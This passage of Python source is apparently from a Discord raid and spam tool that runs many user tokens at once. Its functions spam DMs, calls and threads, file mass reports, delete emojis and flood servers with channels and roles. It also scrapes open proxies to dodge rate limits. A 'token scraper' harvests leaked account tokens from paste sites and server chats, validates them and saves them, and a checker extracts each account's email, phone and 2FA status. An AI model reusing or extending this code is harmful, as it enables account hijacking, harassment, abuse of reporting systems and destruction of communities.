                channel_id = self.open_dm(token, user_id)

                json_data = {
                    'recipients': None,
                }

                response = self.request(
                    "POST",
                    f"https://discord.com/api/v9/channels/{channel_id}/call",
                    token,
                    json=json_data
                )

                if response.status_code == 200:
                    console.log("Called", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                    ws = websocket.WebSocket()
                    self.voice_spammer(token, ws, channel_id, channel_id, True)
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    return
                time.sleep(5)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def dm_spammer(self, token, user_id, message):
        try:
            channel_id = self.open_dm(token, user_id)

            while not STRIKE_EVENT.is_set():
                payload = {
                    "content": message,
                    "nonce": self.nonce(),
                }

                response = self.request(
                    "POST",
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    token,
                    json=payload
                )

                if response and response.status_code == 200:
                    console.log("Send", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                elif response:
                    err_msg = response.json().get("message", f"HTTP {response.status_code}")
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", err_msg)
                    if response.status_code == 401 or response.status_code == 403: break # Dead token or no perms
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "Network/Proxy Failure")
                    break
                time.sleep(7)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def format_tokens(self):
        try:
            formatted = []

            for token in tokens:
                token = token.strip()

                if token:
                    tokens_split = token.split(":")
                    if len(tokens_split) >= 3:
                        formatted_token = tokens_split[2]
                        formatted.append(formatted_token)
                    else:
                        formatted.append(token)

            console.log("Success", C["green"], f"Formatted {len(formatted)} tokens")

            with open("data/tokens.txt", "w") as f:
                for token in formatted:
                    f.write(f"{token}\n")
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def bio_changer(self, token, bio):
        try:
            payload = {
                "bio": bio
            }

            response = self.request(
                "PATCH",
                "https://discord.com/api/v9/users/@me/profile",
                token,
                json=payload
            )

            if response.status_code == 200:
                console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", bio)
            elif response.status_code == 429:
                console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def mass_nick(self, token, guild, nick):
        try:
            payload = {
                "nick" : nick
            }

            response = self.request(
                "PATCH",
                f"https://discord.com/api/v9/guilds/{guild}/members/@me",
                token,
                json=payload
            )

            if response.status_code == 200:
                console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def thread_spammer(self, token, channel_id, name):
        try:
            payload = {
                "name": name,
                "type": 11,
                "auto_archive_duration": 4320,
                "location": "Thread Browser Toolbar",
            }

            while not STRIKE_EVENT.is_set():
                response = self.request(
                    "POST",
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    token,
                    json=payload
                )

                if response.status_code == 201:
                    console.log("Created", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                elif response.status_code == 429:
                    retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                    if int(retry_after) > 10:
                        console.log("Stopped", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s",)
                        break
                    else:
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def typier(self, token, channel_id):
        try:
            while not STRIKE_EVENT.is_set():
                response = self.request(
                    "POST",
                    f"https://discord.com/api/v9/channels/{channel_id}/typing",
                    token
                )

                if response.status_code == 204:
                    console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    time.sleep(9)
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def friender(self, token, nickname):
        try:
            payload = {
                "username": nickname,
                "discriminator": None,
            }

            response = self.request(
                "POST",
                f"https://discord.com/api/v9/users/@me/relationships",
                token,
                json=payload
            )

            if response.status_code == 204:
                console.log(f"Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            elif response.status_code == 400:
                console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json())
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def guild_checker(self, guild_id):
        def main_checker(token):
            try:
                while not STRIKE_EVENT.is_set():
                    response = self.request(
                        "GET",
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        token
                    )

                    if response.status_code == 200:
                        console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        break
                    elif response.status_code == 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    else:
                        console.log("Not Found", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        break
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main_checker, args)

    def token_checker(self):
        """MEGA-UPGRADED TOKEN CHECKER with detailed account analysis"""
        valid = []
        invalid = []
        locked = []
        
        # Statistics tracking
        stats = {
            "total": len(tokens),
            "valid": 0,
            "invalid": 0,
            "locked": 0,
            "nitro": 0,
            "2fa_enabled": 0,
            "verified_email": 0,
            "verified_phone": 0
        }
        
        def task(token):
            token = token.strip()
            # Try Elite Request (Proxies/TLS)
            res = self.request("GET", "https://discord.com/api/v9/users/@me", token)

            # Fallback to Direct (No Proxy) if Elite fails
            if not res or res.status_code not in [200, 401, 403]:
                try:
                    res = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}, timeout=5)
                except:
                    res = None

            if res and res.status_code == 200:
                try:
                    data = res.json()
                    tag = f"{data['username']}#{data.get('discriminator', '0000')}"
                    
                    # Feature 1: Detailed Token Info
                    email = data.get('email', 'N/A')
                    phone = data.get('phone', 'N/A')
                    verified = data.get('verified', False)
                    mfa_enabled = data.get('mfa_enabled', False)
                    premium_type = data.get('premium_type', 0)
                    
                    # Feature 2: Account Age Detection
                    user_id = data.get('id')
                    if user_id:
                        timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
                        from datetime import datetime
                        created_at = datetime.fromtimestamp(timestamp)
                        age_days = (datetime.now() - created_at).days
                    else:
                        age_days = 0
                    
                    # Feature 3: Server & Friend Count
                    try:
                        guilds_res = self.request("GET", "https://discord.com/api/v9/users/@me/guilds", token)
                        server_count = len(guilds_res.json()) if guilds_res and guilds_res.status_code == 200 else 0
                    except:
                        server_count = 0
                    
                    try:
                        friends_res = self.request("GET", "https://discord.com/api/v9/users/@me/relationships", token)
                        friend_count = len([f for f in friends_res.json() if f.get('type') == 1]) if friends_res and friends_res.status_code == 200 else 0
                    except:
                        friend_count = 0
                    
                    # Update statistics
                    stats["valid"] += 1
                    if premium_type > 0:
                        stats["nitro"] += 1
                    if mfa_enabled:
                        stats["2fa_enabled"] += 1
                    if verified:
                        stats["verified_email"] += 1
                    if phone and phone != 'N/A':
                        stats["verified_phone"] += 1
                    
                    # Enhanced logging
                    nitro_status = ["None", "Nitro Classic", "Nitro"][premium_type] if premium_type <= 2 else "Nitro"
                    console.log("Valid", C["green"], f"{token[:25]}...", 
                               f"{tag} | {email} | {nitro_status} | 2FA:{mfa_enabled} | Age:{age_days}d | Servers:{server_count} | Friends:{friend_count}")
                    
                    valid.append(f"{token} | {tag} | {email} | {nitro_status}")
                    
                except Exception as e:
                    console.log("Valid", C["green"], f"{token[:25]}...", "Parsed Info Error")
                    valid.append(token)
                    stats["valid"] += 1
                    
            elif res and res.status_code == 403:
                console.log("Locked", C["yellow"], f"{token[:25]}...", "Verification Required")
                locked.append(token)
                stats["locked"] += 1
            elif res and res.status_code == 401:
                console.log("Invalid", C["red"], f"{token[:25]}...", "Expired/Dead")
                invalid.append(token)
                stats["invalid"] += 1
            else:
                status = res.status_code if res else "Conn Error"
                console.log("Failed", C["rose"], f"{token[:25]}...", f"Error {status}")
                invalid.append(token)
                stats["invalid"] += 1

        args = [(token,) for token in tokens]
        try:
            Menu().run(task, args)
        finally:
            # Feature 4: Separate Valid/Invalid Export
            if valid:
                with open("data/tokens.txt", "w") as f:
                    f.write("\n".join(valid))
                console.log("Exported", C["green"], "Valid Tokens", f"data/tokens.txt ({len(valid)} tokens)")
            
            if invalid:
                with open("data/invalid_tokens.txt", "w") as f:
                    f.write("\n".join(invalid))
                console.log("Exported", C["red"], "Invalid Tokens", f"data/invalid_tokens.txt ({len(invalid)} tokens)")
            
            if locked:
                with open("data/locked_tokens.txt", "w") as f:
                    f.write("\n".join(locked))
                console.log("Exported", C["yellow"], "Locked Tokens", f"data/locked_tokens.txt ({len(locked)} tokens)")
            
            # Feature 5: Comprehensive Statistics
            console.log("STATISTICS", C["cyan"], "═" * 60)
            console.log("TOTAL", C["white"], str(stats["total"]))
            console.log("VALID", C["green"], str(stats["valid"]))
            console.log("INVALID", C["red"], str(stats["invalid"]))
            console.log("LOCKED", C["yellow"], str(stats["locked"]))
            console.log("NITRO", C["magenta"], str(stats["nitro"]))
            console.log("2FA ENABLED", C["cyan"], str(stats["2fa_enabled"]))
            console.log("EMAIL VERIFIED", C["green"], str(stats["verified_email"]))
            console.log("PHONE VERIFIED", C["green"], str(stats["verified_phone"]))
            success_rate = (stats["valid"] / stats["total"] * 100) if stats["total"] > 0 else 0
            console.log("SUCCESS RATE", C["cyan"], f"{success_rate:.1f}%")
            console.log("═" * 70, C["cyan"])

    def proxy_overdrive(self):
        """Lethal Auto-Proxy Overdrive: Scrape & Verify Millions"""
        console.log("SYSTEM", C["gray"], "Sucking raw lists from global data centers...")
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"
        ]

        raw_proxies = []
        for s in sources:
            if STRIKE_EVENT.is_set(): break
            try:
                res = requests.get(s, timeout=10)
                if res.status_code == 200:
                    found = re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", res.text)
                    raw_proxies.extend(found)
                    console.log("SCRAPE", C["aqua"], f"Added {len(found)} potential nodes from {s.split('/')[2]}")
            except: pass

        raw_proxies = list(set(raw_proxies))
        total = len(raw_proxies)
        console.log("STRIKE", C["yellow"], f"Commencing Validation Strike on {total} candidates...")

        live_count = 0
        def verify(proxy):
            nonlocal live_count
            try:
                # Fast probe to Discord experiments endpoint
                proxies_proto = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                res = requests.get("https://discord.com/api/v9/experiments", proxies=proxies_proto, timeout=3)
                if res.status_code == 200:
                    console.log("LIVE", C["green"], f"{proxy} (Verified)")
                    with open("data/proxies.txt", "a") as f:
                        f.write(f"{proxy}\n")
                    live_count += 1
            except: pass

        args = [(p,) for p in raw_proxies]
        Menu().run(verify, args)


    def proxy_cleaner(self):
        console.log("INIT", C["cyan"], "Smart Proxy Cleaner", "Testing proxies with Discord API...")
        global proxies
        
        if not proxies:
            console.log("ERROR", C["red"], "Proxy grid is empty. Nothing to clean.")
            return
            
        # 1. Backup original file
        try:
            shutil.copy("data/proxies.txt", "data/proxies.bak")
            console.log("BACKUP", C["gray"], "Proxies Backup Created", "data/proxies.bak")
        except: pass

        console.log("SYSTEM", C["gray"], f"Preparing to test {len(proxies)} proxies...")
        working_proxies = []
        dead_proxies = []
        lock = threading.Lock()
        original_proxies = list(proxies)
        
        def test_proxy(proxy):
            """Test proxy with Discord API - returns True if working"""
            try:
                # Use req_session (tls_client) for proper testing
                proxy_url = proxy if "://" in proxy else f"http://{proxy}"
                
                # Increased timeout to 10s for slower proxies
                res = req_session.get(
                    "https://discord.com/api/v9/gateway",
                    proxy=proxy_url,
                    timeout=10
                )
                
                # Lenient validation (Status 200 or 429 means it connected)
                if res and (res.status_code == 200 or res.status_code == 429):
                    with lock:
                        working_proxies.append(proxy)
                    console.log("WORKING", C["green"], f"{proxy[:30]}...", "Alive")
                    return True
                else:
                    with lock:
                        dead_proxies.append(proxy)
                    console.log("DEAD", C["red"], f"{proxy[:30]}...", f"Status {res.status_code if res else 'No Response'}")
                    return False
            except Exception as e:
                with lock:
                    dead_proxies.append(proxy)
                # console.log("DEAD", C["red"], f"{proxy[:30]}...", "Connection Failed")
                return False

        # Test all proxies in parallel
        try:
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(test_proxy, proxy) for proxy in original_proxies]
                for future in futures:
                    if STRIKE_EVENT.is_set(): break
                    future.result()
        except KeyboardInterrupt:
            console.log("WARN", C["yellow"], "Interrupted!", "Saving verified proxies so far...")
        
        # Safe Save - Only if we found working proxies or user interrupted
        if working_proxies:
            with open("data/proxies.txt", "w") as f:
                f.write("\n".join(working_proxies) + ("\n" if working_proxies else ""))
            
            # Update global
            proxies = working_proxies
            console.log("COMPLETE", C["cyan"], "Proxy Cleaner Finished", 
                       f"Working: {len(working_proxies)} | Remvoed: {len(dead_proxies)}")
        else:
            console.log("WARN", C["yellow"], "No Working Proxies Found", "Restoring backup recommended if this was a mistake.")

    def token_scraper(self, mode="1"):
        """The Vacuum v4: THE MEGALODON (Full URL Infinity Loop)"""
        while not STRIKE_EVENT.is_set():
            if mode == "1": # THE MEGALODON - Web Crawler (Worker System)
                # Worker assignment - each thread gets a specific target
                worker_id = threading.current_thread().name

                dump_sites = [
                    {"url": "https://pastebin.com/archive", "type": "pastebin"},
                    {"url": "https://controlc.com/", "type": "controlc"},
                    {"url": "https://dpaste.org/", "type": "dpaste"},
                ]

                # Assign site based on thread
                site_index = hash(worker_id) % len(dump_sites)
                site = dump_sites[site_index]

                timestamp = datetime.now().strftime("%H:%M:%S")

                # User-Agent rotation
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
                ]

                print(f"[{timestamp}] {C['aqua']}[WORKER-{site_index}] {C['gray']}Scanning {site['type'].upper()}...")

                try:
                    res = requests.get(site['url'], headers={"User-Agent": random.choice(user_agents)}, timeout=10)

                    if res.status_code == 200:
                        if site['type'] == 'pastebin':
                            paste_ids = re.findall(r'<a href="/([a-zA-Z0-9]{8})"', res.text)
                            if paste_ids:
                                print(f"[{timestamp}] {C['yellow']}[WORKER-{site_index}] {C['gray']}Found {len(paste_ids)} pastes")
                                for paste_id in paste_ids[:3]:  # Only 3 per cycle
                                    if STRIKE_EVENT.is_set(): break
                                    try:
                                        paste_url = f"https://pastebin.com/raw/{paste_id}"
                                        paste_res = requests.get(paste_url, headers={"User-Agent": random.choice(user_agents)}, timeout=10)
                                        if paste_res.status_code == 200:
                                            potential = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", paste_res.text)
                                            if potential:
                                                print(f"[{timestamp}] {C['green']}[HIT] {C['gray']}Found {len(potential)} tokens in {paste_id}")
                                                for t in list(set(potential)):
                                                    self.validate_token(t, f"Pastebin:{paste_id}")
                                        time.sleep(1)
                                    except: pass
                            else:
                                print(f"[{timestamp}] {C['gray']}[WORKER-{site_index}] No pastes")

                        else:
                            # For other sites, direct scan
                            potential = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", res.text)
                            if potential:
                                print(f"[{timestamp}] {C['green']}[HIT] {C['gray']}Found {len(potential)} tokens on {site['type']}")
                                for t in list(set(potential)):
                                    self.validate_token(t, site['type'])
                            else:
                                print(f"[{timestamp}] {C['gray']}[WORKER-{site_index}] Clean")

                    elif res.status_code == 429:
                        print(f"[{timestamp}] {C['red']}[WORKER-{site_index}] Rate-limited, cooling down...")
                        time.sleep(60)
                    else:
                        print(f"[{timestamp}] {C['red']}[WORKER-{site_index}] Blocked ({res.status_code})")

                    # Worker-specific delay
                    time.sleep(random.uniform(15, 25))

                except Exception as e:
                    print(f"[{timestamp}] {C['red']}[WORKER-{site_index}] Error: {str(e)[:30]}")
                    time.sleep(10)

            elif mode == "2": # THE MEGALODON - Channel Sniper
                if not tokens: break
                token = random.choice(tokens)
                try:
                    guilds = self.request("GET", "https://discord.com/api/v9/users/@me/guilds", token).json()
                    for g in guilds:
                        if STRIKE_EVENT.is_set(): break
                        t_now = datetime.now().strftime("%H:%M:%S")
                        print(f"[{t_now}] {C['aqua']}[SNIPE] {C['gray']}Targeting Guild: {Fore.LIGHTWHITE_EX}{g.get('name', 'Unknown')}{Fore.RESET}")

                        chans = self.request("GET", f"https://discord.com/api/v9/guilds/{g['id']}/channels", token).json()
                        for c in chans:
                            if STRIKE_EVENT.is_set(): break
                            print(f"[{t_now}] {C['gray']}[SCAN] Scraping Chat: #{c.get('name', 'Unknown')}")
                            msgs = self.request("GET", f"https://discord.com/api/v9/channels/{c['id']}/messages?limit=50", token).json()
                            if isinstance(msgs, list):
                                for m in msgs:
                                    potential = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", str(m))
                                    for t in potential:
                                        self.validate_token(t, f"Server: {g.get('name','')} | #{c.get('name','')}")
                    time.sleep(0.5)
                except: pass

    def validate_token(self, token, source_name):
        """Ultra-Fast Validation with Waterfall Feedback"""
        res = self.request("GET", "https://discord.com/api/v9/users/@me/library", token)
        if res and res.status_code == 200:
            console.log("SUCCESS", C["green"], f"VALID TOKEN: {token}", f"Source: {source_name}")
            with open("data/hits.txt", "a") as f: f.write(f"{token}\n")
            if token not in tokens: tokens.append(token)
        else:
            console.log("FAIL", C["red"], f"INVALID TOKEN: {token[:30]}...", "VOID")

    def accept_rules(self, guild_id):
        try:
            # Fetch rules info using first token
            rules_payload = None
            for token in tokens:
                res = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/member-verification?with_guild=false", token)
                if res and res.status_code == 200:
                    rules_payload = res.json()
                    break

            if not rules_payload:
                console.log("Failed", C["red"], "Could not fetch rules or all tokens rate-limited")
                return

            def task(token):
                res = self.request("PUT", f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me", token, json=rules_payload)
                if res and res.status_code == 201:
                    console.log("Accepted", C["green"], f"{token[:25]}...", f"Server: {guild_id}")
                else:
                    msg = res.json().get("message", "Error") if res else "No Response"
                    console.log("Failed", C["red"], f"{token[:25]}...", msg)

            args = [(token,) for token in tokens]
            Menu().run(task, args)
        except Exception as e:
            console.log("Error", C["red"], "Rules Acceptor Failure", e)

    def onboard_bypass(self, guild_id):
        try:
            onboarding_responses_seen = {}
            onboarding_prompts_seen = {}
            onboarding_responses = []
            in_guild = []

            for _token in tokens:
                response = self.request(
                    "GET",
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
                    _token
                )

                if response.status_code == 200:
                    in_guild.append(_token)
                    break

            if not in_guild:
                console.log("Failed", C["red"], "Missing Access")
                input()
                Menu().main_menu()
            else:
                data = response.json()
                now = int(datetime.now().timestamp())

                for __ in data["prompts"]:
                    onboarding_responses.append(__["options"][-1]["id"])

                    onboarding_prompts_seen[__["id"]] = now

                    for prompt in __["options"]:
                        if prompt:
                            onboarding_responses_seen[prompt["id"]] = now
                        else:
                            console.log("Failed", C["red"], "No onboarding in This Server",)
                            input()
                            Menu().main_menu()

            def run_task(token):
                try:
                    json_data = {
                        "onboarding_responses": onboarding_responses,
                        "onboarding_prompts_seen": onboarding_prompts_seen,
                        "onboarding_responses_seen": onboarding_responses_seen,
                    }

                    response = req_session.post(
                        f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                        headers=self.headers(token),
                        json=json_data
                    )

                    if response.status_code == 200:
                        console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token, ) for token in tokens
            ]
            Menu().run(run_task, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Pass Onboard", e)
            input()
            Menu().main_menu()

    def reactor_main(self, channel_id, message_id):
        try:
            access_token = []
            emojis = []

            params = {
                "around": message_id,
                "limit": 50
            }

            for token in tokens:
                response = req_session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )

                if response.status_code == 200:
                    access_token.append(token)
                    break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
            else:
                data = response.json()
                for __ in data:
                    if __["id"] == message_id:
                        reactions = __["reactions"]
                        for emois in reactions:
                            if emois:
                                emoji_id = emois["emoji"]["id"]
                                emoji_name = emois["emoji"]["name"]

                                if emoji_id is None:
                                    emojis.append(emoji_name)
                                else:
                                    emojis.append(f"{emoji_name}:{emoji_id}")
                            else:
                                console.log("Failed", C["red"], "No reactions Found in this message",)
                                input()
                                Menu().main_menu()

                for i, emoji in enumerate(emojis, start=1):
                    print(f"{C[color]}0{i}:{C['white']} {emoji}")

                choice = input(f"\n{console.prompt('Choice')}")
                if choice.startswith('0') and len(choice) == 2:
                    choice = str(int(choice))
                selected = emojis[int(choice) - 1]

            def add_reaction(token):
                try:
                    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{selected}/@me"
                    response = req_session.put(url, headers=self.headers(token))

                    if response.status_code == 204:
                        console.log("Reacted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", selected)
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(add_reaction, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get emojis", e)
            input()
            Menu().main_menu()

    def button_bypass(self, channel_id, message_id, guild_id):
        try:
            access_token = []
            buttons = []

            params = {"around": message_id, "limit": 50}

            for token in tokens:
                response = req_session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )

                if response.status_code == 200:
                    access_token.append(token)
                    break

            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
            else:
                message = next((m for m in response.json() if m["id"] == message_id), None)

                if not message:
                    console.log("Failed", C["red"], "Message not found")
                    input()
                    Menu().main_menu()
                else:
                    for row in message.get("components", []):
                        for comp in row.get("components", []):
                            if comp.get("type") == 2:
                                label = comp.get("label", "No Label")
                                custom_id = comp["custom_id"]
                                buttons.append({
                                    "label": label,
                                    "custom_id": custom_id,
                                })

                    if not buttons:
                        console.log("Failed", C["red"], "No buttons found in this message")
                        input()
                        Menu().main_menu()

            for i, btn in enumerate(buttons, start=1):
                print(f"{C[color]}0{i}:{C['white']} {btn['label']}")

            choice = input(f"\n{console.prompt('Choice')}")
            if choice.startswith('0') and len(choice) == 2:
                choice = str(int(choice))

            btn = buttons[int(choice) - 1]
            custom_id = btn["custom_id"]

            def click_button(token):
                try:
                    payload = {
                        "application_id": message["author"]["id"],
                        "channel_id": channel_id,
                        "data": {
                            "component_type": 2,
                            "custom_id": custom_id,
                        },
                        "guild_id": guild_id,
                        "message_flags": 0,
                        "message_id": message_id,
                        "nonce": self.nonce(),
                        "session_id": uuid.uuid4().hex,
                        "type": 3,
                    }

                    resp = req_session.post(
                        "https://discord.com/api/v9/interactions",
                        headers=self.headers(token),
                        json=payload
                    )

                    if resp.status_code == 204:
                        console.log("Clicked", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", btn["label"])
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [
                (token,) for token in tokens
            ]
            Menu().run(click_button, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get buttons", e)
            input()
            Menu().main_menu()

    def mass_report(self, token, guild_id, channel_id, message_id, reason):
        try:
            payload = {"guild_id": guild_id, "channel_id": channel_id, "message_id": message_id, "reason": reason}
            res = req_session.post("https://discord.com/api/v9/reports", headers=self.headers(token), json=payload)
            if res.status_code == 204:
                console.log("Reported", C["green"], f"{token[:25]}", f"Reason: {reason}")
            else:
                console.log("Failed", C["red"], f"{token[:25]}", res.json().get("message", "Error"))
        except Exception as e:
            console.log("Error", C["red"], f"{token[:15]}...", e)

    def hypesquad(self, token, house_id):
        try:
            payload = {"house_id": house_id}
            headers = self.headers(token)
            headers["referer"] = "https://discord.com/channels/@me"
            res = req_session.post("https://discord.com/api/v9/hypesquad/online", headers=headers, json=payload)
            if res.status_code == 204:
                console.log("HypeSquad", C["green"], f"{token[:25]}", f"House: {house_id}")
            else:
                console.log("Failed", C["red"], f"{token[:25]}", "Error")
        except Exception as e:
            console.log("Error", C["red"], f"{token[:15]}...", e)

    def mass_block(self, token, user_id):
        try:
            res = req_session.put(f"https://discord.com/api/v9/users/@me/relationships/{user_id}", headers=self.headers(token), json={"type": 2})
            if res.status_code == 204:
                console.log("Blocked", C["yellow"], f"{token[:25]}", f"User: {user_id}")
            else:
                console.log("Failed", C["red"], f"{token[:25]}", "Error")
        except Exception as e:
            console.log("Error", C["red"], f"{token[:15]}...", e)

    def delete_all_emojis(self, guild_id):
        token = random.choice(tokens)
        res = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/emojis", token)
        if not res or res.status_code != 200: return
        emojis = res.json()
        chunks = [emojis[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for e in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/guilds/{guild_id}/emojis/{e['id']}", token)
                console.log("Deleted", C["red"], "Emoji", e["name"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def mass_create_channels(self, guild_id, name):
        def task(token):
            for _ in range(25):
                self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token, json={"name": f"{name}-{uuid.uuid4().hex[:5]}", "type": 0})
                console.log("Created", C["green"], "Channel", name)

        with ThreadPoolExecutor(max_workers=50) as exe:
            for token in tokens: exe.submit(task, token)

    def mass_create_roles(self, guild_id, name):
        def task(token):
            for _ in range(25):
                self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token, json={"name": name, "color": random.randint(0, 0xFFFFFF)})
                console.log("Created", C["green"], "Role", name)

        with ThreadPoolExecutor(max_workers=50) as exe:
            for token in tokens: exe.submit(task, token)

    def leave_all(self, token):
        try:
            res = self.request("GET", "https://discord.com/api/v9/users/@me/guilds", token)
            if res and res.status_code == 200:
                guilds = res.json()
